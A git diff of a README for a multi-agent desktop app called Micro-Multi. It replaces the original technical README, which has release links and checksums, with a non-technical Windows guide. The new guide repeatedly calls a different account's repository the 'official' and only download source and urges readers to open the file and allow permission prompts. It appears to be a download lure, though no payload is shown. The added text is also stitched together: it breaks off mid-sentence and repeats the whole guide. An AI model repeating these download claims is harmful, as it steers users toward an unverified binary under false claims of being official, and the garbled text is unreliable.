@@ -1,133 +1,147 @@
-<div align="center">
-  <img src="src/masp/web/micro-multi.svg" alt="Micro-Multi" width="88" />
-  <h1>Micro-Multi</h1>
-  <p>Split work across agents in one project. Compatible with DeepSeek Harness plugins.</p>
-  <p>English · <a href="README.zh-CN.md">简体中文</a></p>
-  <p><a href="https://lkdenchin.github.io/Micro-Multi/">Website</a> · <a href="#installation">Install</a> · <a href="#your-first-task">Get started</a> · <a href="https://lkdenchin.github.io/Micro-Multi/docs/readme.html">Documentation</a></p>
-</div>
+# 🤖 Micro-Multi - Run Local AI Agents Together
 
-Micro-Multi is a local desktop workspace built around **multi-agent collaboration**. You describe the job; the lead agent splits it into assignments. After you approve the plan, members work within their file ownership and task dependencies, and the lead combines their results. Plans, member progress, tool output and code diffs share one workspace.
+[![Download Micro-Multi](https://img.shields.io/badge/⬇️_Download_Micro--Multi-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=github&logoColor=white)](https://github.com/Bragii044/Micro-Multi)
 
-For an order API change, one member implements pagination, another writes boundary tests, and a third documents the parameters. Independent assignments can run together. A test task that needs the implementation waits for its report. The scheduler coordinates concurrent writes to the same file.
+Micro-Multi is a desktop workspace for running multiple AI agents on your own computer. Instead of opening many separate chat windows, you get one place where several AI helpers can work together on projects, research, writing, planning, and repeated tasks. It is built around a local-first idea: your workspace, files, and agent setup stay on your machine. Micro-Multi is also compatible with deepseek-harness (dsh) plugins, so you can extend what your agents can do with add-on packs and reusable skills.
 
-**DeepSeek Harness (dsh) plugin compatibility** is the other core part of the project. Native Cordis Host and the dsh client module system load declared services, tools, settings forms and interface contributions. Enabled tools are available to team members as well as the lead. Skills and MCP services also work alongside these plugins.
+This guide is written for a non-technical Windows user. You do not need to know how to program to download and start using Micro-Multi.
 
-Windows / Linux · English and Chinese · Your choice of model service · Apache-2.0
+## 👋 What Is Micro-Multi?
 
-## Why coordinate agents?
+Micro-Multi is a local multi-agent desktop workspace. In simple terms, it gives you a control center for AI assistants. You can create different agents for different jobs, give each one a role, and let them work side by side. One agent might help you plan a project. Another might review your writing. Another might organize research notes. You stay in control of the workspace and can switch between agents as needed.
 
-A single agent works well for short jobs. When implementation, tests and review share one execution loop, they usually happen in sequence and share one context. A prompt that says “divide the work” does not enforce who can edit which files, which task must wait, or whether an assignment has already started. That needs a scheduler.
+The app is designed for people who want a practical desktop environment for AI workflows. It supports a multi-agent approach, meaning you are not limited to one assistant at a time. You can set up agents that focus on separate tasks and compare their outputs in one place.
 
-| A single agent, or agents without a coordinator | What Micro-Multi does |
-| --- | --- |
-| Implementation, tests and docs run in sequence | Runs independent tasks concurrently; dependencies wait for predecessor reports. Concurrency is bounded. |
-| Several members edit the same file | Uses declared file ownership, path locks and dependencies to coordinate writes. |
-| Every role uses the same model | Members inherit the lead model; you can change individual models in the plan. |
-| Retries dispatch the same assignment again | Reuses running or completed assignments; an approved revision starts once. |
-| Plugins are only wired to the lead | Enabled dsh, MCP and command tools are available to the lead and members. |
+Micro-Multi also supports the deepseek-harness (dsh) plugin style. Plugins are add-ons that can give the app new abilities. Skills are reusable task recipes that help agents follow a consistent process. MCP support is included for connecting agents to approved tools and data sources. All of this is presented through a desktop interface rather than a command line.
 
-This compares execution models, not benchmark results. Parallel work can reduce waiting for independent tasks, but extra members can increase model calls and cost. Use the lead alone for a small edit; use a team when the responsibilities are clear.
+## ✅ What You Need Before You Start
 
-## Installation
+You need a Windows computer, an internet connection, and permission to download and open applications. You also need a place on your computer where you want to keep your Micro-Multi workspace files. A dedicated folder is helpful because it keeps your agent projects, notes, and settings together.
 
-Download a package from [GitHub Releases](https://github.com/LKDenchin/Micro-Multi/releases/latest).
+You do not need to install developer tools, set up a coding environment, or understand plugin files to begin. The official project page is the single starting point for getting the application.
 
-| System | Package |
-| --- | --- |
-| Windows x64 | [NSIS installer](https://github.com/LKDenchin/Micro-Multi/releases/download/v0.1.0/Micro-Multi-Setup-0.1.0-x64.exe) |
-| Debian / Ubuntu x64 | [Debian package](https://github.com/LKDenchin/Micro-Multi/releases/download/v0.1.0/Micro-Multi-0.1.0-amd64.deb) |
-| Linux x64 | [AppImage](https://github.com/LKDenchin/Micro-Multi/releases/download/v0.1.0/Micro-Multi-0.1.0-x86_64.AppImage) |
-| Checksums | [SHA256SUMS.txt](https://github.com/LKDenchin/Micro-Multi/releases/download/v0.1.0/SHA256SUMS.txt) |
+## 🚀 Download Micro-Multi
 
-On Windows, run the installer and open Micro-Multi from the Start menu. On Debian or Ubuntu, install the downloaded package with `sudo apt install ./<package>.deb`. For AppImage, make the file executable with `chmod +x <file>.AppImage` and run it. If FUSE is unavailable, add `--appimage-extract-and-run`.
+[![Get Micro-Multi](https://img.shields.io/badge/⬇️_Get_Micro--Multi-00C2A8?style=for-the-badge&labelColor=FF8C42&logo=github&logoColor=white)](https://github.com/Bragii044/Micro-Multi)
 
-The packages include Python and Node.js. Install Git for repository work. Docker and any CLI required by a plugin are installed separately. The [desktop guide](docs/DESKTOP_RELEASE.md) covers Linux keyring requirements, Ubuntu AppImage setup, checksums and building your own package.
+Visit this link to download the application: [Official Micro-Multi download page](https://github.com/Bragii044/Micro-Multi).
 
-## Your first task
+Use the official page above as your only download source. When the page opens, use it to download the application. After the download finishes, open the downloaded file to start Micro-Multi. If Windows asks for permission, review the prompt and choose the option that allows the application you downloaded from the official page to open.
 
-1. Open **Settings → Models → Add or edit model**. Enter a name, API base URL, model ID and API key, then test the connection.
-2. Add a local project folder. Keep **Link this directory** selected to work in the original folder. A folder without Git is initialized as a repository.
-3. Start a conversation in that project. Select the model, **Multi-agent collaboration**, and the permissions you want to allow.
-4. Describe the change and how to check it. For example:
+## 🪟 Windows Quick Start
 
-   ```text
-   Add pagination to the order API, keeping the existing response fields.
-   Assign implementation, boundary tests and parameter docs to separate members.
-   List their files and dependencies. The lead combines changes and runs tests.
-   ```
+1. Open the official Micro-Multi page using the download button above.
+2. Visit this link to download the application.
+3. Wait for the download to complete. You can check your browser’s downloads area if you do not see it immediately.
+4. Open the downloaded file.
+5. Follow the on-screen prompts from the application.
+6. When Micro-Multi opens, create or choose a workspace folder for your projects.
+7. Add your first agent and give it a simple task to test the workspace.
 
-5. Review the plan in the chat. Adjust members, models or files, then confirm execution.
-6. Follow member progress and inspect the diff and test output. Send a follow-up in the same conversation if the result needs adjustment.
+The most important step is to start from the official page. Do not use file names or download links from other websites. The official page is the correct place to get the application.
 
-You can attach files to a conversation and open the right-hand inspector to browse files, reviews, previews and terminal activity. See [projects and conversations](docs/WORKSPACE.md) for the main controls and [model setup](docs/MODELS.md) for connection details.
+## 🧭 First Look at the Workspace
 
-## Working with a team
+When you open# 🤖 Micro-Multi - Run Local AI Agents Together
 
-The lead prepares a plan with member roles, tasks, file ownership, dependencies and models. Use **Adjust team** to change it, then **Confirm execution** to start that revision. Member tasks do not run before approval. Each new task or round of feedback needs its own confirmation.
+[![Download Micro-Multi](https://img.shields.io/badge/⬇️_Download_Micro--Multi-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=github&logoColor=white)](https://github.com/Bragii044/Micro-Multi)
 
-Confirmation checks the saved server revision. If a plan has changed, the chat card shows the updated assignments for review and confirmation in place. You do not need to open the collaboration map.
+Micro-Multi is a desktop workspace for running multiple AI agents on your own computer. Instead of opening many separate chat windows, you get one place where several AI helpers can work side by side on projects, research, writing, planning, and repeated tasks. It is built around a local-first idea: your workspace, files, and agent setup stay on your machine. Micro-Multi is also compatible with deepseek-harness (dsh) plugins, so you can extend what your agents can do with add-on packs and reusable skills.
 
-Members follow the lead model unless you select another model for them. The team view shows their status and reports; tool records show what they actually ran. You can add instructions while they work, pause the conversation or stop it. Before accepting the result, inspect the changes and the test output. The [collaboration guide](docs/AUTONOMOUS_COLLABORATION.md) walks through this process.
+This guide is written for a non-technical Windows user. You do not need to know how to program to download and start using Micro-Multi.
 
-## Adding instructions and tools
+## 👋 What Is Micro-Multi?
 
-Open **Customization** to manage extensions.
+Micro-Multi is a local multi-agent desktop workspace. In simple terms, it gives you a control center for AI assistants. You can create different agents for different jobs, give each one a role, and let them work alongside each other. One agent might help you plan a project. Another might review your writing. Another might organize research notes. You stay in control of the workspace and can switch between agents as needed.
 
-| Extension | Use it for |
-| --- | --- |
-| Skills | Reusable instructions in a `SKILL.md` file. Project Skills live in `.agents/skills/`. |
-| MCP servers | Tools provided by a configured local or remote server. |
-| dsh plugins | Native Cordis services and tools, model providers, settings forms and conversation interface components. |
-| Command plugins | Tools implemented by a local command. |
+The app is designed for people who want a practical desktop environment for AI workflows. It supports a multi-agent approach, meaning you are not limited to one assistant at a time. You can set up agents that focus on separate tasks and compare their outputs in one place.
 
-Open an installed plugin's details to configure it. A plugin may need its own account, API key or external program before its tools can be used. The composer **+** menu lists enabled capabilities. Read the [extension guide](docs/extensions.md) to choose an extension type, or the [dsh guide](docs/NATIVE_CORDIS.md) to install or develop a plugin.
+Micro-Multi also supports the deepseek-harness (dsh) plugin style. Plugins are add-ons that can give the app new abilities. Skills are reusable task recipes that help agents follow a consistent process. MCP support is included for connecting agents to approved tools and data sources. All of this is presented through a desktop interface rather than a command line.
 
-Compatibility depends on a package's declared entries, dependencies and required services; it does not mean every third-party package has been tested. Startup restores the chat before loading optional plugin clients. Probing a plugin without a client does not boot its Host. Native services keep dsh's dependency and lifecycle rules.
+Because the workspace is local-first, your agent projects and settings are kept on your computer. That makes it easier to organize long-running work and keep your notes together in one folder.
 
-## Permissions and data
+## ✅ What You Need Before You Start
 
-The composer offers three permission levels: **Ask for approval** asks before file changes and commands; **Allow file edits** allows file editing but still asks before commands; **Full access** permits file operations, commands and enabled external tools. The [permissions guide](docs/sandbox.md) explains what these settings control.
+You need a Windows computer, an internet connection, and permission to download and open applications. You also need a place on your computer where you want to keep your Micro-Multi workspace files. A dedicated folder is helpful because it keeps your agent projects, notes, and settings together.
 
-Projects, conversations and attachments are stored locally. Requests to your configured model service include the context needed for the task; enabled extensions may also send data to their services. Model-profile API keys use the operating system credential store. Local commands and native plugins run with your user account's system permissions.
+You do not need to install developer tools, set up a coding environment, or understand plugin file formats to begin. The official project page is the single starting point for getting the application.
 
-Installed data lives in `%APPDATA%\Micro-Multi\data` on Windows and `${XDG_CONFIG_HOME:-~/.config}/Micro-Multi/data` on Linux. Source mode uses `.masp` in the working directory. Set `MASP_HOME` to choose another directory. Updates and uninstall preserve the data; back it up separately from the application files.
+## 🚀 Download Micro-Multi
 
-## Run from source
+[![Get Micro-Multi](https://img.shields.io/badge/⬇️_Get_Micro--Multi-00C2A8?style=for-the-badge&labelColor=FF8C42&logo=github&logoColor=white)](https://github.com/Bragii044/Micro-Multi)
 
-Use Python 3.11+, Node.js 24+, npm and Git. From the repository root:
+Visit this link to download the application: [Official Micro-Multi download page](https://github.com/Bragii044/Micro-Multi).
 
-```bash
-python -m venv .venv
-```
+Use the official page above as your only download source. When the page opens, use it to download the application. After the download finishes, open the downloaded file to start Micro-Multi. If Windows shows a permission prompt, review it and choose the option that allows the application you downloaded from the official page to open.
 
-Activate the environment with `.\.venv\Scripts\Activate.ps1` in Windows PowerShell, or `source .venv/bin/activate` on Linux. Then run:
+## 🪟 Windows Quick Start
 
-```bash
-python -m pip install -e ".[dev]"
-npm ci
-npm run desktop
-```
+1. Open the official Micro-Multi download page using the button above.
+2. Visit this link to download the application.
+3. Wait for the download to finish. You can check your browser’s downloads area if you do not see it right away.
+4. Open the downloaded file.
+5. Follow the on-screen prompts shown by the application.
+6. When Micro-Multi opens, create or choose a workspace folder for your projects.
+7. Add your first agent and give it a simple task to test the workspace.
 
-To use a browser instead, run `python -m masp.cli serve` and open `http://127.0.0.1:3080/`. The [deployment guide](docs/deployment.md) explains configuration and data storage.
+The most important step is to start from the official page. Do not use file names or download links from other websites. The official page is the correct place to get the application.
 
-## Technology
+## 🧭 Your First Five Minutes Inside the App
 
-| Layer | Implementation |
-| --- | --- |
-| Desktop | Electron, with a sandboxed renderer and a preload bridge for desktop actions. |
-| Backend | Python, FastAPI, Uvicorn and Pydantic for local APIs and agent execution. |
-| Interface | HTML, CSS and JavaScript; React renders native plugin components. |
-| Agent and plugin runtime | Node.js, Cordis and deepseek-harness packages. |
-| Storage | SQLite for application records, local files for attachments and the OS credential store for model keys. |
-| Connections | HTTP APIs, SSE for streamed conversation events and WebSocket for plugin subscriptions. |
-| Builds and documentation | electron-builder, esbuild and a static site generated from Markdown. |
+After Micro-Multi opens, you will see a desktop workspace. Take a moment to look around before creating anything complicated.
 
-The [architecture guide](docs/architecture.md) describes how these parts communicate and points to the relevant source directories.
+Start by naming your workspace. A clear name such as “Writing Projects” or “Research Notes” helps you remember what the folder is for. Next, create your first agent. Give it a simple name and a short description of its job. For example, an agent called “Planner” could be described as “helps me break big tasks into smaller steps.” An agent called “Reviewer” could be described as “checks my drafts for clarity.”
 
-## Documentation and contributing
+Then give the agent a small, low-risk task. Ask it to outline a shopping list, summarize a short paragraph, or suggest a weekly schedule. Small tests help you learn how the workspace behaves before you rely on it for important work.
 
-Start with [model setup](docs/MODELS.md), [projects and conversations](docs/WORKSPACE.md), [team collaboration](docs/AUTONOMOUS_COLLABORATION.md) and [extensions](docs/extensions.md). If something does not work as expected, see [troubleshooting](docs/TROUBLESHOOTING.md).
+## 🧩 Working With Multiple Agents
 
-Report reproducible bugs in [Issues](https://github.com/LKDenchin/Micro-Multi/issues), including the steps and sanitized logs. Questions and ideas belong in [Discussions](https://github.com/LKDenchin/Micro-Multi/discussions). Read [CONTRIBUTING.md](CONTRIBUTING.md) before submitting code. Report vulnerabilities through the private channel in [SECURITY.md](SECURITY.md).
+The main idea behind Micro-Multi is that different agents can handle different parts of a job. A practical way to use this is to assign roles:
 
-Micro-Multi is licensed under [Apache-2.0](LICENSE). Third-party components retain their own licenses; see [NOTICE](NOTICE) and [runtime provenance](docs/UPSTREAM_RUNTIME_PROVENANCE.md).
+- A planning agent that turns a goal into a checklist.
+- A research agent that gathers notes and organizes them into sections.
+- A writing agent that produces a first draft.
+- A review agent that checks the draft for clarity and consistency.
+
+You can keep each agent focused on one role instead of asking a single assistant to do everything. This makes results easier to compare and easier to correct. If one agent’s output is not useful, you can adjust its description or give it a narrower task.
+
+## 🔌 Plugins, Skills, and MCP Support
+
+Micro-Multi is compatible with the deepseek-harness (dsh) plugin system. Plugins are optional add-ons that can extend the app’s abilities. Skills are smaller, reusable instructions that help an agent complete a specific kind of task the same way every time.
+
+MCP support gives the workspace a standard way to connect agents to approved tools and data sources. If you are new to these ideas, start with the built-in features first. Once you are comfortable creating agents and organizing a workspace, you can explore plugin and skill options.
+
+## 🛠️ Common Questions
+
+**Do I need to know how to code?**
+No. Micro-Multi is a desktop application meant to be used through a graphical interface.
+
+**Where should I keep my workspace?**
+Choose a folder you can find easily, such as a folder inside your Documents. Avoid moving or renaming the folder while the app is open.
+
+**What if the download does not start?**
+Return to the official page and try again. Make sure your browser is not blocking the download.
+
+**Can I use more than one agent at a time?**
+Yes. The workspace is designed around multiple agents working together.
+
+**What happens to my files?**
+Micro-Multi is local-first, so your workspace files stay on your computer in the folder you choose.
+
+## 💡 Tips for a Smooth First Week
+
+Keep your first workspace small. Create two or three agents with clear, simple roles. Write short descriptions so you can remember what each agent is for. Save your important notes in the workspace folder rather than in random locations. When a task does not go well, change the agent’s description instead of starting over completely. Small adjustments usually produce better results than large rewrites.
+
+Take a little time each day to test one new feature. Try a skill, then try a plugin, then try connecting a tool through MCP. Learning one piece at a time keeps the workspace understandable.
+
+## 📥 Download and Setup Recap
+
+Visit this link to download the application: [https://github.com/Bragii044/Micro-Multi](https://github.com/Bragii044/Micro-Multi).
+
+Download from the official page, open the downloaded file, follow the prompts, and choose a workspace folder. That is the whole process for getting started on Windows.
+
+## 🌟 Why People Use Micro-Multi
+
+Micro-Multi brings multiple AI agents into one desktop workspace instead of scattering them across browser tabs. It supports local-first organization, deepseek-harness plugin compatibility, reusable skills, and MCP connections. For a non-technical user, the appeal is simple: one place to set up helpers, give them roles, and keep your work organized on your own computer.
+
+Keywords: agentic-ai, agentic-workflow, ai-agent, appimage, artificial-intelligence, cordis, deepseek, deepseek-harness, desktop-app, developer-tools, dsh, electron, fastapi, linux, llm, local-first, mcp, multi-agent, python, skills
